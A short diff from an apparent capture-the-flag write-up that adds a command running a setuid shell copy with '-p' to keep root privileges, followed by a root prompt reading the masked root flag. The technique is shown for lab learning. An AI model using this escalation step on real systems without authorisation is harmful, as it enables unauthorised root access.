@@ -496,6 +496,7 @@ svc@busqueda:/dev/shm$ sudo python3 /opt/scripts/system-checkup.py full-checkup
 - /tmp/0xdf is there, owned by root, and the s bit is on
 - run with -p to not drop privs:
 ```
+svc@busqueda:/dev/shm$ /tmp/0xdf -p
 0xdf-5.1# cat root.txt
 8********************
 0xdf-5.1# whoami
